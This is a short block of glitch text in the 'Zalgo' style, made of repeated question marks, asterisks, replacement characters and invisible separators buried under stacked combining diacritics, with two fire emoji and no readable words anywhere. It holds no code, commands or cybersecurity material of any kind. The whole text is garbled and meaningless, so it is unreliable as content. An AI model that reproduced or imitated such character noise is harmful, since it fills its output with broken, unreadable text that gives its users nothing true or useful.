̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̿̿̀̊̒́̀